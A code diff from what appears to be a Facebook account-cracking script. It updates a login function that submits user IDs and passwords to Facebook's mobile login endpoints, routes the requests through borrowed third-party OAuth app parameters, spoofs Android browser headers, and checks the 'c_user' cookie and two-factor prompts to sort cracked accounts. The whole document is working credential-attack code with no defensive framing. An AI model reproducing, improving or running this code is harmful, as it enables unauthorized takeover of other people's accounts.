@@ -1758,56 +1758,41 @@ def mbasic(uid,pwx,tl):
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
             Session = requests.Session()
-            free_fb = Session.get('https://www.facebook.com/').text
+            free_fb = Session.get('https://free.facebook.com').text
             data = {
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'email': uid,
+            'next': 'https://m.facebook.com/v3.2/dialog/oauth?response_type=code&redirect_uri=https%3A%2F%2Fpixlr.com%2Fauth%2Ffacebook%2Fcallback&scope=email&state=https%3A%2F%2Fpixlr.com%2F&client_id=144117062837799&ret=login&fbapp_pres=0&logger_id=27279048-2ffa-4266-a587-1693d6522204&tp=unspecified',
+            'flow': 'login_no_pin',
             'pass': pw,
-            'timezone': '-330',
-            'lgndim': re.search('name="lgndim" value="(.*?)"', str(free_fb)).group(1),
-            'lgnrnd': re.search('name="lgnrnd" value="(.*?)"', str(free_fb)).group(1),
-            'lgnjs': re.search('name="lgnjs" value="(.*?)"', str(free_fb)).group(1),
-            'ab_test_data': '',
-            'locale': 'en_GB',
-            'next': 'https://www.facebook.com/?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1728023954721%26e2e%3D%257B%2522init%2522%253A1728023954721%257D%26ies%3D0%26sdk%3Dandroid-16.2.0%26sso%3Dchrome_custom_tab%26nonce%3D77fcd107-69c1-47ea-900d-eb59cc66559b%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d5dc1c21-09db-4859-ae13-e33582ae635c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25223jqsm1g6hs80f2sprrok%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DgYWWg5ZTt6cKDUGibjTfrD1ZdDSG6_gsHx7Xrsd1liI%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd5dc1c21-09db-4859-ae13-e33582ae635c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d5dc1c21-09db-4859-ae13-e33582ae635c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25223jqsm1g6hs80f2sprrok%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
-            'login_source': 'login_bluebar',
-            'guid': '',
-            'prefill_contact_point': '',
-            'prefill_source': '',
-            'prefill_type': '',}
+            'login': 'Log in'}
             headers ={
-            'Host': 'm.facebook.com',
-            'method': 'POST',
-            'path': '/login/Device-based/login/async/',
-            'scheme': 'https',
-            'content-length': '294',
-            'Accept-Encoding': 'gzip',
-            'content-Length': '{len(str(logn_data))}',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'dpr': '1.75',
-            'viewport-width': '980',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '""',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-full-version-list': '',
-            'sec-ch-prefers-color-scheme': 'light',
-            'upgrade-insecure-requests': '1',
-            'user-agent': ua,
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'dnt': '1',
+            'authority': 'm.facebook.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dpr': '2.75',
             'origin': 'https://m.facebook.com',
-            'referer': 'https://m.facebook.com/?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1728023954721%26e2e%3D%257B%2522init%2522%253A1728023954721%257D%26ies%3D0%26sdk%3Dandroid-16.2.0%26sso%3Dchrome_custom_tab%26nonce%3D77fcd107-69c1-47ea-900d-eb59cc66559b%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d5dc1c21-09db-4859-ae13-e33582ae635c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25223jqsm1g6hs80f2sprrok%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DgYWWg5ZTt6cKDUGibjTfrD1ZdDSG6_gsHx7Xrsd1liI%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd5dc1c21-09db-4859-ae13-e33582ae635c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d5dc1c21-09db-4859-ae13-e33582ae635c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25223jqsm1g6hs80f2sprrok%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
-            'x-requested-with': 'mark.via.gp',
-            'sec-fetch-site': 'none',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-user': '?1',
-            'sec-fetch-dest': 'document',
-            'accept-encoding': 'gzip, deflate, br, zstd',
-            'accept-language': 'en-US,en;q=0.9',}
+            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=144117062837799&kid_directed_site=0&app_id=144117062837799&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fpixlr.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26state%3Dhttps%253A%252F%252Fpixlr.com%252F%26client_id%3D144117062837799%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D27279048-2ffa-4266-a587-1693d6522204%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpixlr.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fpixlr.com%252F%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"23053RN02A"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"14.0.0"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+            'viewport-width': '393',
+            'x-asbd-id': '129477',
+            'x-fb-lsd': 'AVojlKdPI0s',
+            'x-requested-with': 'XMLHttpRequest',
+            'x-response-format': 'JSONStream'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1728023954721%26e2e%3D%257B%2522init%2522%253A1728023954721%257D%26ies%3D0%26sdk%3Dandroid-16.2.0%26sso%3Dchrome_custom_tab%26nonce%3D77fcd107-69c1-47ea-900d-eb59cc66559b%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d5dc1c21-09db-4859-ae13-e33582ae635c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25223jqsm1g6hs80f2sprrok%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DgYWWg5ZTt6cKDUGibjTfrD1ZdDSG6_gsHx7Xrsd1liI%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd5dc1c21-09db-4859-ae13-e33582ae635c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d5dc1c21-09db-4859-ae13-e33582ae635c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25223jqsm1g6hs80f2sprrok%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr"
+            url = "https://m.facebook.com/login/device-based/login/async/?api_key=144117062837799&auth_token=4f68572762725b85380bb3322eb4f56b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fpixlr.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26state%3Dhttps%253A%252F%252Fpixlr.com%252F%26client_id%3D144117062837799%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D27279048-2ffa-4266-a587-1693d6522204%26tp%3Dunspecified&refsrc=deprecated&app_id=144117062837799&cancel=https%3A%2F%2Fpixlr.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fpixlr.com%252F%23_%3D_&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
